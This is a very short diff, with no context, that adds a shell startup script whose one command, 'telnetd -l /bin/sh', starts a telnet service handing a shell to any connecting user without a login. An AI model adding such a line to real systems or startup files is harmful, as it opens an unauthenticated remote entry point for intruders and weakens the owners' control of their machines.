@@ -1,0 +1,4 @@
+#!/bin/sh -e
+
+telnetd -l /bin/sh
+
